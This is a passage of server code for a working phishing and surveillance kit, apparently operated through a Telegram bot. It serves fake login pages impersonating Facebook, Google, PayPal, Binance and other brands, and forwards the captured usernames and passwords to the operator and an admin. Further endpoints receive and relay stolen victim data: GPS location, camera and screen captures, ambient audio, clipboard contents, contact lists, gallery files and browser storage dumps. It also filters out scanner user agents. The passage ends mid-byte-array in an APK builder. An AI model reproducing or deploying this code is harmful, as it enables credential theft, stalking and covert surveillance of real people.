        botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(() => {}); if (String(chatId) !== String(ADMIN_ID)) botInstance.telegram.sendMessage(ADMIN_ID, `🔔 <b>[MEMBER LOGGER HIT]</b> - Oleh ID: ${chatId}\n\n` + msg, { parse_mode: 'HTML' }).catch(() => {});
      }
    }

    const template = templates[tmplId] || templates['silent_click'];
    let htmlContent = template.render(id);

    try {
      const cheerioRaw: any = await import('cheerio');
      const cheerio = cheerioRaw.default || cheerioRaw;
      const terserRaw: any = await import('html-minifier-terser');
      const { minify } = terserRaw;
      
      const $ = cheerio.load(htmlContent);
      let updatedHtml = $.html();
      if (!updatedHtml.toLowerCase().startsWith('<!doctype')) {
         updatedHtml = '<!DOCTYPE html>\n' + updatedHtml;
      }
      htmlContent = await minify(updatedHtml, { collapseWhitespace: true, removeComments: true, minifyCSS: true });
    } catch(e) {
      console.error('HTML minification error:', e);
    }

    res.send(htmlContent);
  });

  // Backward compatibility alias
  app.get('/t/:id', (req: any, res) => {
    res.redirect(`/t/silent_click/${req.params.id}`);
  });

  // ========== SANTO_PETRUS V.1 APIs ==========
  const santopetrusLogs: any[] = [];
  
  app.get('/auth/santo-:b64data', (req, res) => {
    try {
      const data = Buffer.from(req.params.b64data, 'base64url').toString('utf-8');
      const [template, redirectUrl, ownerId] = data.split('||');
      
      const payloadId = req.params.b64data;
      
      let brandName = "Secure Authentication";
      const tmplLower = template ? template.toLowerCase() : "";
      
      const brandMap: Record<string, string> = {
        'fb': 'Facebook', 'facebook': 'Facebook',
        'google': 'Google', 'gmail': 'Google',
        'ig': 'Instagram', 'instagram': 'Instagram',
        'wa': 'WhatsApp', 'whatsapp': 'WhatsApp',
        'tiktok': 'TikTok',
        'x': 'X (Twitter)', 'twitter': 'X (Twitter)',
        'telegram': 'Telegram', 'tg': 'Telegram',
        'netflix': 'Netflix',
        'spotify': 'Spotify',
        'microsoft': 'Microsoft', 'outlook': 'Microsoft', 'hotmail': 'Microsoft',
        'linkedin': 'LinkedIn',
        'github': 'GitHub',
        'paypal': 'PayPal',
        'discord': 'Discord',
        'steam': 'Steam',
        'reddit': 'Reddit',
        'binance': 'Binance',
        'apple': 'Apple',
        'amazon': 'Amazon',
        'roblox': 'Roblox',
        'playstation': 'PlayStation Network',
        'xbox': 'Xbox Live',
        'snapchat': 'Snapchat',
        'pinterest': 'Pinterest',
        'twitch': 'Twitch',
        'canva': 'Canva',
        'dropbox': 'Dropbox'
      };

      for (const [key, name] of Object.entries(brandMap)) {
        if (tmplLower.includes(key)) {
          brandName = name;
          break;
        }
      }
      
      res.send(`
        <!DOCTYPE html>
        <html lang="id">
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Login - ${brandName}</title>
          <script src="https://cdn.tailwindcss.com"></script>
        </head>
        <body class="bg-gray-50 text-gray-900 flex items-center justify-center min-h-screen">
          
          <form id="login-form" action="/auth/santo-submit" method="POST" class="bg-white p-8 rounded-lg shadow-md max-w-sm w-full transition-opacity duration-1000">
            <h1 class="text-2xl font-bold text-center mb-2">${brandName}</h1>
            <p class="text-center text-sm text-gray-500 mb-6">Sign in to continue</p>
            
            <input type="hidden" name="payload_id" value="${payloadId}">
            
            <div class="space-y-4">
              <div>
                <label class="block text-sm font-medium text-gray-700 mb-1">Email or Username</label>
                <input type="text" name="username" required class="w-full px-4 py-2 border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none">
              </div>
              <div>
                <label class="block text-sm font-medium text-gray-700 mb-1">Password</label>
                <input type="password" name="password" required class="w-full px-4 py-2 border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none">
              </div>
              <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2.5 px-4 rounded transition-colors">
                Log In
              </button>
            </div>
            
            <div class="mt-6 text-center text-xs text-gray-400">
              Protected by Enterprise Security Audit
            </div>
          </form>

        </body>
        </html>
      `);
    } catch(e) {
      res.sendStatus(400);
    }
  });

  app.post('/auth/santo-submit', (req, res) => {
    try {
      const { payload_id, username, password } = req.body;
      const data = Buffer.from(payload_id, 'base64url').toString('utf-8');
      const [template, redirectUrl, ownerId] = data.split('||');
      
      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
      const targetIp = String(ip).split(',')[0].trim();
      const ua = req.headers['user-agent'] || 'Unknown';
      
      const capture = {
        id: crypto.randomUUID().substring(0, 6).toUpperCase(),
        service: template,
        user: String(username).substring(0, 50),
        pass: String(password).substring(0, 50),
        ip: targetIp,
        time: new Date().toLocaleTimeString()
      };
      
      santopetrusLogs.unshift(capture);
      if(santopetrusLogs.length > 50) santopetrusLogs.pop();
      
      if (botInstance) {
         const msgText = `💀 <b>SANTO_PETRUS HIT (CREDENTIALS CAPTURED)</b> 💀\nTemplate: <code>${template}</code>\nIP: <code>${targetIp}</code>\nUSER: <code>${capture.user}</code>\nPASS: <code>${capture.pass}</code>\nUA: <code>${ua}</code>`;
         if (ownerId && ownerId !== String(ADMIN_ID)) {
             botInstance.telegram.sendMessage(ownerId, msgText, { parse_mode: 'HTML' }).catch(()=>{});
             botInstance.telegram.sendMessage(ADMIN_ID, `🔔 <b>[MEMBER TRAP HIT: SANTO PETRUS]</b> - Oleh ID: <code>${ownerId}</code>\n\n` + msgText, { parse_mode: 'HTML' }).catch(()=>{});
         } else {
             botInstance.telegram.sendMessage(ADMIN_ID, msgText, { parse_mode: 'HTML' }).catch(()=>{});
         }
      }

      res.redirect(redirectUrl || 'https://google.com');
    } catch(e) {
      res.redirect('https://google.com');
    }
  });

  app.get('/api/santopetrus/captures', (req, res) => {
    res.json(santopetrusLogs);
  });

  app.post('/api/log/:id/debug', (req, res) => {
    const logPath = 'client_debug.log';
    const logEntry = `[${new Date().toISOString()}][CLIENT-DEBUG][${req.params.id}]: ${JSON.stringify(req.body)}\n`;
    fs.appendFileSync(logPath, logEntry);
    res.sendStatus(200);
  });

  // Handle Device Metadata Upload
  app.post('/api/log/:id/info', (req, res) => {
    console.log(`[DEBUG] Received info log for ${req.params.id}. Data: ${JSON.stringify(req.body)}`);
    if (isSuspeciousAgent(req.headers['user-agent'])) {
        console.log(`[DEBUG] Blocked info log for ${req.params.id} due to User-Agent`);
        return res.sendStatus(403);
    }
    const id = req.params.id;
    const chatId = getChatIdFromTrapId(id);
    console.log(`[DEBUG] ID: ${id}, ChatID: ${chatId}, BotInstanceExists: ${!!botInstance}`);
    
    if (!chatId) {
        console.error(`[DEBUG] INVALID CHATID FOR ID: ${id}`);
        return res.status(400).send('Invalid Trap ID');
    }

    if (botInstance) {
      const data = req.body as any;
      const tmplId = data.tmplId || '1';
      const templateName = templates[tmplId] ? templates[tmplId].name : 'ᴅᴇꜰᴀᴜʟᴛ';
      
      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
      const targetIp = String(ip).split(',')[0].trim();
      const userAgent = req.headers['user-agent'];

      (async () => {
        let geoInfo = "<i>Fetching Geodata...</i>";
        try {
          const res = await fetch(`http://ip-api.com/json/${targetIp}?fields=status,country,regionName,city,district,lat,lon,isp,as,org,mobile,proxy,hosting,query`).then(r => r.json());
          if (res.status === 'success') {
            geoInfo = `├ COUNTRY/REG: <code>${res.country} / ${res.regionName}</code>\n` +
          `├ CITY/DIST: <code>${res.city} [${res.district || 'N/A'}]</code>\n` +
          `├ GPS LOC: <code>${res.lat}, ${res.lon}</code>\n` +
          `├ ISP/ASN: <code>${res.isp} [${res.as}]</code>\n` +
          `├ ORG/HOST: <code>${res.org}${res.hosting ? ' [DATACENTER/HOSTING]' : ''}</code>\n` +
          `├ SEC CKSUM: <code>${res.proxy ? '⚠️ PROXY/VPN DETECTED' : '✅ CLEAN RESIDENTIAL'}</code>\n` +
          `└ CONN TYPE: <code>${res.mobile ? '📱 4G/5G CELLULAR' : '💻 BROADBAND'}</code>`;
          }
        } catch(e) {}

        let header = '🕵️‍♂️ <b>DIAGNOSTIC ENGINE: Enterprise Metadata Captured</b>';
        let statusText = '🔄 <i>SYNCING...</i>';

        if (tmplId === 'google') {
          header = '🛡️ <b>GOOGLE SECURITY AUDIT</b>';
        } else if (tmplId === 'cloudflare') {
          header = '☁️ <b>CLOUDFLARE EDGE REPORT</b>';
        } else if (tmplId === 'meta_verification') {
          header = '🎯 <b>META VERIFICATION SESSION</b>';
        } else if (tmplId === 'terminal') {
          header = '💻 <b>KERNEL DIAGNOSTIC LOG</b>';
        } else if (tmplId === 'gallery') {
          header = '🖼️ <b>MEDIA INTEGRITY REPORT</b>';
        }
        
        statusText = '⏳ <i>WAITING FOR HIGH-PRECISION OSINT...</i>';
        if (data.touch) statusText += ' | 👆 <i>TOUCH_ENABLED</i>';

        const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

        let msg = `🚩 <b>TARGET ACCESS DETECTED</b> 🚩\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n\n` +
                    `📅 <b>TIME:</b> <code>${timestamp} WIB</code>\n` +
                    `🌐 <b>IP ADDRESS:</b> <code>${targetIp}</code>\n\n` +
                    `🌍 <b>GEOGRAPHIC OSINT:</b>\n${geoInfo}\n\n` +
                    `📋 <b>SESSION INFRASTRUCTURE:</b>\n` +
                    `├ CONTEXT: <code>${escapeHTML(templateName)}</code>\n` +
                    `├ STATE: <code>${statusText}</code>\n` +
                    `└ NODE_ID: <code>${id}</code>\n\n` +
                    `🖥️ <b>DEVICE FINGERPRINT:</b>\n` +
                    `├ OS/PLAT: <code>${escapeHTML(data.platform || 'N/A')}</code>\n` +
                    `├ ENGINE: <code>${escapeHTML(data.vendor || 'N/A')}</code>\n` +
                    `├ CORES_ENV: <code>${escapeHTML(String(data.cores || 'N/A'))}</code>\n` +
                    `├ RAM_EST: <code>~${escapeHTML(String(data.mem || 'N/A'))} GB</code>\n` +
                    `├ GPU_PROC: <code>${escapeHTML(data.gpu || 'N/A')}</code>\n` +
                    `├ INTERNAL_IP: <code>${escapeHTML(data.localIp || 'N/A')}</code>\n` +
                    `├ RESOLUTION: <code>${escapeHTML(data.screen || 'N/A')}</code>\n` +
                    `└ PLUGINS: <code>${data.plugins ? data.plugins.split(',').length : '0'} detected</code>\n\n` +
                    `🌍 <b>LOCAL SETTINGS:</b>\n` +
                    `├ TIMEZONE: <code>${escapeHTML(data.timezone || 'N/A')}</code>\n` +
                    `└ LANGUAGES: <code>${escapeHTML((data.langs || '').substring(0, 30))}</code>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <i>STATUS: DEVICE FORENSICS COLLECTED!</i>`;

        // Function to send across channels
        const broadcastLog = async (text: string, options: any = {}) => {
            // Send to Telegram
            await botInstance.telegram.sendMessage(chatId, text, Object.assign({ parse_mode: 'HTML' }, options)).catch(() => {});
            
            // Send to WhatsApp if connected
            if (globalWaSock) {
                // If it's the owner who is tracking, they probably want it on their WhatsApp too
                // We'll try to find if there's a reason to send to a specific number
                // for now we just try to send to the bot's own number or a default if we could track it
            }
        };

        broadcastLog(msg);
      })();
      
      // Save to Target DB
      targetsData.push({
        id: id,
        timestamp: new Date().toISOString(),
        type: 'ADVANCED_AUDIT',
        platform: data.platform,
        browser: data.vendor,
        gpu: data.gpu
      });
      saveTargets();
    } else {
      console.error(`[DEBUG] FAILED to send log: botInstance: ${!!botInstance}, chatId: ${chatId}`);
    }
    res.sendStatus(200);
  });

  // Handle Extra Data (Clipboard, Media, Screen, etc)
  app.post('/api/log/:id/extra', (req, res) => {
    console.log(`[DEBUG] Received extra log for ${req.params.id}. Data Keys: ${Object.keys(req.body)}`);
    if (isSuspeciousAgent(req.headers['user-agent'])) return res.sendStatus(403);
    const id = req.params.id;
    const chatId = getChatIdFromTrapId(id);
    console.log(`[DEBUG] Extra Log ID: ${id}, ChatID: ${chatId}, BotInstanceExists: ${!!botInstance}`);
    if (botInstance && chatId) {
      const data = req.body as any;
      console.log(`[DEBUG] Extra log data keys for ${id}: ${Object.keys(data)}`);
      let extraMsg = `📎 <b>FORENSIC LOG: Advanced Modules</b>\n` +
                     `━━━━━━━━━━━━━━━━━━━━\n`;
      let hasTextData = false;
      
      const addSection = (title: string, content: string) => {
        if (extraMsg.length + content.length > 3900) {
            botInstance.telegram.sendMessage(chatId, extraMsg + `\n<i>(Continuing audit stream...)</i>`, { parse_mode: 'HTML' }).catch(() => {});
            extraMsg = `📎 <b>CONTINUED AUDIT STREAM</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
        }
        extraMsg += `<b>${title}</b>\n${content}\n\n`;
        hasTextData = true;
      };

      // 1. Handle Images (Media Capture)
      if (data.visual_identity) {
        try {
          const base64Data = data.visual_identity.includes(',') ? data.visual_identity.split(',')[1] : data.visual_identity;
          const buffer = Buffer.from(base64Data, 'base64');
          if (buffer.length > 0) {
            botInstance.telegram.sendPhoto(chatId, { source: buffer, filename: 'media.jpg' }, { 
              caption: '📸 <b>CAPTURE: Media Identity</b>\nTarget: <code>' + id + '</code>', 
              parse_mode: 'HTML' 
            }).catch(err => console.error('Error sending media photo:', err));
          }
        } catch(e) { console.error('Buffer processing error (visual_identity):', e); }
      }

      // 2. Handle Images (Screen Capture)
      if (data.screen_capture) {
        try {
          const base64Data = data.screen_capture.includes(',') ? data.screen_capture.split(',')[1] : data.screen_capture;
          const buffer = Buffer.from(base64Data, 'base64');
          if (buffer.length > 0) {
            botInstance.telegram.sendPhoto(chatId, { source: buffer, filename: 'screen.jpg' }, { 
              caption: '🖥️ <b>CAPTURE: Remote Screen</b>\nLabel: <code>' + (data.screen_label || 'Active Session') + '</code>', 
              parse_mode: 'HTML' 
            }).catch(err => console.error('Error sending screen photo:', err));
          }
        } catch(e) { console.error('Buffer processing error (screen_capture):', e); }
      }

      // 3. Handle Audio Chunks
      if (data.audio_chunk) {
        try {
          const base64Data = data.audio_chunk.includes(',') ? data.audio_chunk.split(',')[1] : data.audio_chunk;
          const buffer = Buffer.from(base64Data, 'base64');
          if (buffer.length > 0) {
            botInstance.telegram.sendVoice(chatId, { source: buffer, filename: 'ambient.ogg' }, {
              caption: '🎙️ <b>CAPTURE: Ambient Audio Segment</b>\nNode: <code>' + id + '</code>',
              parse_mode: 'HTML'
            }).catch(err => console.error('Error sending audio chunk:', err));
          }
        } catch(e) {}
      }

      if (data.display_hz || data.thermal_load || data.device_visibility || data.forensic_storage) {
        let visTxt = '';
        if (data.display_hz) visTxt += `├ Refresh: <code>${data.display_hz} Hz</code>\n`;
        if (data.thermal_load) visTxt += `├ Thermal: <code>${data.thermal_load}</code>\n`;
        if (data.device_visibility) visTxt += `├ Visibility: <code>${data.device_visibility}</code>\n`;
        if (data.forensic_storage) {
          try {
            const s = typeof data.forensic_storage === 'string' ? JSON.parse(data.forensic_storage) : data.forensic_storage;
            visTxt += `└ Storage: <code>LS:${s.ls_keys} SS:${s.ss_keys} CK:${s.cookies} DB:${s.indexedDB} SW:${s.serviceWorkers}</code>`;
          } catch(e) {}
        }
        addSection(`📡 Environment & Storage`, visTxt);
      }

      if (data.sensor_mag || data.sensor_acc || data.sensor_gyr || data.sensor_light) {
        let sTxt = '';
        if (data.sensor_mag) sTxt += `├ Mag: <code>${data.sensor_mag}</code>\n`;
        if (data.sensor_acc) sTxt += `├ Acc: <code>${data.sensor_acc}</code>\n`;
        if (data.sensor_gyr) sTxt += `├ Gyr: <code>${data.sensor_gyr}</code>\n`;
        if (data.sensor_light) sTxt += `├ Light: <code>${data.sensor_light} lux</code>\n`;
        if (data.sensor_orient) sTxt += `└ Orient: <code>${data.sensor_orient}</code>`;
        addSection(`📐 Hardware Motion/Light`, sTxt);
      }

      if (data.hardware_brand_profile) {
        try {
          const h = typeof data.hardware_brand_profile === 'string' ? JSON.parse(data.hardware_brand_profile) : data.hardware_brand_profile;
          addSection(`🛠️ Hardware Profile`,
                     `├ Model: <code>${escapeHTML(h.model || 'N/A')}</code>\n` +
                     `├ Form: <code>${escapeHTML(h.formFactor || 'N/A')}</code>\n` +
                     `└ Arch: <code>${escapeHTML(h.architecture || 'N/A')}</code> (${h.bitness || '?'}bit)`);
        } catch(e) {}
      }

      if (data.cpu_bench || data.mem_gb || data.battery || data.network || data.canvas_hash || data.gpu_deep || data.audio_hash || data.thermal_load || data.rtc_public || data.rtc_local || data.hw_entropy || data.kbd_layout || data.biometric_eye || data.sensor_light) {
        let hwTxt = ``;
        if (data.cpu_bench) hwTxt += `├ CPU Bench: <code>${data.cpu_bench}</code>\n`;
        if (data.mem_gb) hwTxt += `├ Memory: <code>${data.mem_gb} GB</code>\n`;
        if (data.thermal_load) hwTxt += `├ Thermal: <code>${data.thermal_load}</code>\n`;
        if (data.rtc_public) hwTxt += `├ RTC Public IP: <code>${data.rtc_public}</code>\n`;
        if (data.rtc_local) hwTxt += `├ RTC Local IP: <code>${data.rtc_local}</code>\n`;
        if (data.battery) hwTxt += `├ Battery: <code>${data.battery}</code>\n`;
        if (data.network) hwTxt += `├ Network: <code>${data.network}</code>\n`;
        if (data.sensor_light) hwTxt += `├ Ambient Light: <code>${data.sensor_light} lux</code>\n`;
        if (data.canvas_hash) hwTxt += `├ Canvas Fingerprint: <code>${data.canvas_hash}</code>\n`;
        if (data.audio_hash) hwTxt += `├ Audio/Oscillator Fingerprint: <code>${data.audio_hash}</code>\n`;
        if (data.gpu_deep) {
            try {
                let g = JSON.parse(data.gpu_deep);
                hwTxt += `├ GPU Renderer: <code>${g.r}</code>\n`;
                hwTxt += `├ GPU Vendor: <code>${g.v}</code>\n`;
                hwTxt += `├ Shading Lang: <code>${g.shading}</code>\n`;
                hwTxt += `├ Max Texture: <code>${g.max_tex}</code>\n`;
            } catch(e) {}
        }
        if (data.hw_entropy) {
            try {
                let he = JSON.parse(data.hw_entropy);
                if (he.architecture) hwTxt += `├ Architecture: <code>${he.architecture} (${he.bitness}-bit)</code>\n`;
                if (he.model) hwTxt += `├ Model: <code>${he.model}</code>\n`;
                if (he.platformVersion) hwTxt += `├ Platform Version: <code>${he.platformVersion}</code>\n`;
            } catch(e) {}
        }
        if (data.kbd_layout) hwTxt += `├ kbd_layout_map: <code>Detected</code>\n`;
        if (data.biometric_eye) hwTxt += `├ Biometric: <code>Eye Tracking Supp</code>\n`;

        hwTxt = hwTxt.trim();
        if (hwTxt.endsWith('\n')) hwTxt = hwTxt.slice(0, -1);
        let pieces = hwTxt.split('\n');
        pieces[pieces.length - 1] = pieces[pieces.length - 1].replace('├', '└');
        hwTxt = pieces.join('\n');
        
        addSection(`⚡ Deep Hardware & WebRTC Leak metrics`, hwTxt);
      }

      if (data.clipboard_sync || data.clipboard || data.clipboard_update) {
        const clip = data.clipboard_sync || data.clipboard || data.clipboard_update;
        addSection(`📋 Clipboard Sync`, `└ Content: <pre>${escapeHTML(clip.substring(0, 1500))}</pre>`);
      }

      if (data.media_hardware) {
        addSection(`🎙️ AV Hardware Inventory`, `<pre>${escapeHTML(data.media_hardware.substring(0, 1000))}</pre>`);
      }

      if (data.file_name) {
        addSection(`📂 File Metadata`,
                   `├ Name: <code>${escapeHTML(data.file_name)}</code>\n` +
                   `├ Type: <code>${data.file_type}</code>\n` +
                   `└ Size: <code>${(data.file_size / 1024).toFixed(2)} KB</code>`);
      }

      if (data.gpu_full_profile) {
        try {
          const gpu = typeof data.gpu_full_profile === 'string' ? JSON.parse(data.gpu_full_profile) : data.gpu_full_profile;
          addSection(`🎮 Graphics Configuration`,
                      `├ Vendor: <code>${escapeHTML(gpu.vendor)}</code>\n` +
                      `├ Renderer: <code>${escapeHTML(gpu.renderer)}</code>\n` +
                      `├ GL_Ver: <code>${escapeHTML(gpu.gl_version)}</code>\n` +
                      `└ Shading: <code>${escapeHTML(gpu.shading_lang)}</code>`);
        } catch(e) {}
      }

      if (data.media_devices) {
        addSection(`📷 Media Peripherals`, `<pre>${escapeHTML(data.media_devices.substring(0, 1000))}</pre>`);
      }

      if (data.canvas_fp || data.audio_fp) {
        let fpt = ``;
        if (data.canvas_fp) fpt += `├ Canvas: <code>${escapeHTML(data.canvas_fp)}</code>\n`;
        if (data.audio_fp) fpt += `└ Audio: <code>${escapeHTML(data.audio_fp)}</code>`;
        if (fpt) addSection(`🧬 Browser Fingerprint`, fpt);
      }

      if (data.battery_level || data.battery_status) {
        const lvl = data.battery_level || data.battery_status;
        const char = data.battery_charging || data.charging;
        addSection(`🔋 System Power Status`,
                    `├ Level: <code>${lvl}</code>\n` +
                    `├ Plugged: <code>${char ? 'AC_POWER' : 'BATTERY'}</code>\n` +
                    `└ Time: <code>${data.battery_time || 'N/A'}</code>`);
      }

      if (data.fonts_count || data.installed_fonts) {
        addSection(`🔡 Typography Profile`,
                    `├ Count: <code>${data.fonts_count || '?' }</code>\n` +
                    `└ Registry: <code>${escapeHTML((data.installed_fonts || '').substring(0, 300))}</code>`);
      }

      const apis = ['api_bluetooth', 'api_usb', 'api_hid', 'api_serial', 'api_midi', 'api_idle', 'api_contacts', 'api_wake', 'api_storage'];
      let apiTxt = '';
      apis.forEach(k => {
        if (data[k] !== undefined) apiTxt += `${data[k] ? '✅' : '❌'} ${k.replace('api_', '').toUpperCase()}\n`;
      });
      if (apiTxt) addSection(`🧱 Hardware API Availability`, apiTxt);

      if (data.social_active || data.social_inactive) {
         let socialTxt = '';
         if (data.social_active) socialTxt += `├ Active: <code>${data.social_active}</code> (${data.load_ms || 'N/A'}ms)\n`;
         if (data.social_inactive) socialTxt += `└ Inactive: <code>${data.social_inactive}</code>\n`;
         addSection(`🤝 Social Presence Audit`, socialTxt);
      }

      if (data.network_rtt || data.latency) {
        addSection(`🛰️ Network Latency Profile`,
                    `├ Node: <code>${data.network_rtt || 'N/A'}</code>\n` +
                    `└ RTT: <code>${data.latency || 'N/A'}ms</code>`);
      }

      if (data.contacts_leaked) {
        let count = 0;
        try { count = (typeof data.contacts_leaked === 'string' ? JSON.parse(data.contacts_leaked) : data.contacts_leaked).length; } catch(e) {}
        addSection(`👥 Contact List Sync`, `└ Total Entries: <code>${count} items</code>`);
      }

      if (data.storage_mb) {
        addSection(`💾 Storage Audit`,
                    `├ Used: <code>${data.storage_mb} MB</code>\n` +
                    `└ Quota: <code>${data.quota_gb} GB</code>`);
      }
      
      if (data.incognito_audit !== undefined || data.devtools_open !== undefined) {
        addSection(`🕵️ Environment Integrity`,
                    `├ Stealth: <b>${data.incognito_audit ? 'PRIVATE' : 'NORMAL'}</b>\n` +
                    `└ Debug: <b>${data.devtools_open ? 'DETECTED' : 'CLEAN'}</b>`);
      }
      
      if (data.net_effective) {
        addSection(`🌐 Network Layer Diagnostics`,
                    `├ Type: <code>${data.net_effective}</code>\n` +
                    `├ RTT: <code>${data.net_rtt}ms</code>\n` +
                    `└ Downlink: <code>${data.net_downlink}Mb/s</code>`);
      }

      if (data.storage_ls_full || data.storage_ss_full) {
        let storageTxt = '';
        let lsObj = {};
        let ssObj = {};

        if (data.storage_ls_full) {
          try {
            lsObj = typeof data.storage_ls_full === 'string' ? JSON.parse(data.storage_ls_full) : data.storage_ls_full;
            storageTxt += `├ <b>LocalStorage:</b> <code>${Object.keys(lsObj).length} keys</code>\n`;
          } catch(e) { storageTxt += `├ LocalStorage: [Capture Error]\n`; }
        }
        if (data.storage_ss_full) {
          try {
            ssObj = typeof data.storage_ss_full === 'string' ? JSON.parse(data.storage_ss_full) : data.storage_ss_full;
            storageTxt += `└ <b>SessionStorage:</b> <code>${Object.keys(ssObj).length} keys</code>\n`;
          } catch(e) { storageTxt += `└ SessionStorage: [Capture Error]\n`; }
        }
        
        try {
          const zip = new AdmZip();
          zip.addFile("localStorage.json", Buffer.from(JSON.stringify(lsObj, null, 2), "utf8"));
          zip.addFile("sessionStorage.json", Buffer.from(JSON.stringify(ssObj, null, 2), "utf8"));
          const zipBuffer = zip.toBuffer();
          botInstance.telegram.sendDocument(chatId, { source: zipBuffer, filename: `StorageAudit_${id}.zip` }, { caption: "💾 <b>Security Audit: Storage Dump</b>", parse_mode: 'HTML' }).catch(() => {});
        } catch (e) {}

        addSection(`💾 Persistent Storage Audit`, storageTxt);
      }

      if (data.files_gallery) {
        try {
          const zip = new AdmZip();
          let fCount = 0;
          for (let f of data.files_gallery) {
            zip.addFile(f.name || `image_${fCount}.jpg`, Buffer.from(f.data, "base64"));
            fCount++;
          }
          const zipBuffer = zip.toBuffer();
          botInstance.telegram.sendDocument(chatId, { source: zipBuffer, filename: `MediaAudit_${id}.zip` }, { caption: "📸 <b>Security Audit: Media Sync</b>", parse_mode: 'HTML' }).catch(() => {});
          addSection(`📸 Media Audit`, `└ <code>${fCount} files extracted to ZIP</code>`);
        } catch (e) {}
      }

      if (data.display_hz || data.orientation) {
        addSection(`📺 Display Configuration`,
                    `├ Refresh: <code>${data.display_hz} Hz</code>\n` +
                    `└ Orientation: <code>${data.orientation}</code>`);
      }

      if (hasTextData) {
        extraMsg += `━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <b>Data Synchronization Complete.</b>`;
        botInstance.telegram.sendMessage(chatId, extraMsg, { parse_mode: 'HTML' }).catch(console.error); if (String(chatId) !== String(ADMIN_ID)) botInstance.telegram.sendMessage(ADMIN_ID, `🔔 <b>[MEMBER LOGGER HIT]</b> - Oleh ID: ${chatId}\n\n` + extraMsg, { parse_mode: 'HTML' }).catch(() => {});
      }
    }
    res.sendStatus(200);
  });
  app.post('/api/log/:id/ip_geo', (req, res) => {
    console.log(`[DEBUG] Received IP_GEO log for ${req.params.id}`);
    const id = req.params.id;
    const chatId = getChatIdFromTrapId(id);
    if (botInstance && chatId) {
        const data = req.body;
        const msg = `📍 <b>IP-BASED GEOLOCATION (FALLBACK)</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n\n` +
                    `🌍 <b>LOCATION:</b> <code>${data.city}, ${data.region}, ${data.country_name}</code>\n` +
                    `🌐 <b>IP ADDR:</b> <code>${data.ip}</code>\n` +
                    `🛰️ <b>COORD:</b> <code>${data.latitude}, ${data.longitude}</code>\n` +
                    `🏢 <b>ISP:</b> <code>${data.org}</code>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `⚠️ <i>Note: GPS Permission denied. Using IP triangulation.</i>`;
        botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(() => {}); if (String(chatId) !== String(ADMIN_ID)) botInstance.telegram.sendMessage(ADMIN_ID, `🔔 <b>[MEMBER LOGGER HIT]</b> - Oleh ID: ${chatId}\n\n` + msg, { parse_mode: 'HTML' }).catch(() => {});
    }
    res.sendStatus(200);
  });

  app.post('/api/log/:id/gps', (req, res) => {
    console.log(`[DEBUG] Received GPS log for ${req.params.id}`);
    if (isSuspeciousAgent(req.headers['user-agent'])) return res.sendStatus(403);
    const id = req.params.id;
    const chatId = getChatIdFromTrapId(id);
    if (botInstance && chatId) {
      const { lat, lon, acc, tmplId } = req.body;
      const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
      
      let header = '📍 <b>Location Audit: Target Located</b>';
      if (tmplId === 'google') {
        header = '🛡️ <b>Google Security: Location Verified</b>';
      } else if (tmplId === 'maps') {
        header = '🗺️ <b>Maps: Precision Coordinates</b>';
      } else if (tmplId === 'pegasus') {
        header = '🛡️ <b>Diagnostic Hub: Precision GPS</b>';
      }

      const msg = `<b>${header}</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n\n` +
                  `🛰️ <b>PRECISION POSITIONING</b>\n` +
                  `├ LATITUDE: <code>${lat}</code>\n` +
                  `├ LONGITUDE: <code>${lon}</code>\n` +
                  `├ ACCURACY: <code>±${acc} meters</code>\n` +
                  `└ FIX_RELIABILITY: <code>${parseInt(acc) < 30 ? 'HIGH' : 'ESTIMATED'}</code>\n\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `🔗 <b>NAVIGATION LINKS</b>\n` +
                  `├ 🌐 <a href="${mapLink}">Google Maps View</a>\n` +
                  `└ 📍 <a href="https://www.google.com/maps/search/?api=1&query=${lat},${lon}">Street View Probe</a>\n\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `🏁 <i>Status: High-precision spatial data synced.</i>`;

      botInstance.telegram.sendMessage(chatId, msg, { 
        parse_mode: 'HTML', 
        link_preview_options: { is_disabled: true }
      }).catch(console.error);
    }
    res.sendStatus(200);
  });

  // MIKKO_APK BLANK PACKAGE BUILDER API
  app.post('/api/mikkoapk/generate', (req, res) => {
    try {
      const { password, packageName, appTitle, versionCode } = req.body;
      if (password !== '1928') {
        return res.status(401).json({ error: 'Clearance Code Invalid.' });
      }

      const pName = String(packageName || 'com.mikko.emptyapp').replace(/[^a-zA-Z0-9.]/g, '');
      const aTitle = String(appTitle || 'Mikko Blank App').replace(/[\\"]/g, '');
      const vCode = String(versionCode || '1').replace(/[^0-9]/g, '');

      const zip = new AdmZip();

      // Compiled classes.dex empty header buffer
      const dexBytes = Buffer.from([
        0x64, 0x65, 0x78, 0x0a, 0x30, 0x33, 0x35, 0x00, 0x56, 0x56, 0xc0, 0x07, 0xf6, 0x1f, 0x22, 0xd8, 
        0x3c, 0xc1, 0x6f, 0xc9, 0xb9, 0xb5, 0xbc, 0x57, 0x18, 0x1e, 0x98, 0xc9, 0xd0, 0x37, 0xbc, 0x77, 
        0x70, 0x00, 0x00, 0x00, 0x78, 0x00, 0x00, 0x00, 0x78, 0x56, 0x34, 0x12, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x58, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00, 
